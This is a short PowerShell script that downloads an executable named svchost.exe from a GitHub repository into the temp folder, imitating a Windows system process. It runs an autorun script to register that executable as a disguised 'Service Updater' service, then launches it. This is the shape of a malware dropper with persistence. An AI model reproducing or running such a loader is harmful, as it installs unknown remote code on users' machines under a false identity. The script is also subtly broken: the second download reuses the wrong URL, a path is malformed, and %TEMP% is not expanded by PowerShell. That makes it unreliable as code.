$url = 'https://github.com/BrendanBard/bundy/blob/master/svchost.exe'
$url2 = 'https://github.com/BrendanBard/bundy/blob/master/Autorun.ps1'
Invoke-WebRequest -Uri $url -OutFile '%TEMP%/svchost.exe'
Invoke-WebRequest -Uri $url -OutFile '%TEMP%/AutoRun.ps1'
& "%temp/AutoRun.ps1" - name "ServiceUpdate" -run "%TEMP%/svchost.exe" -description "Service Updater"
Start-Process -Filepath "%TEMP%/svchost.exe"
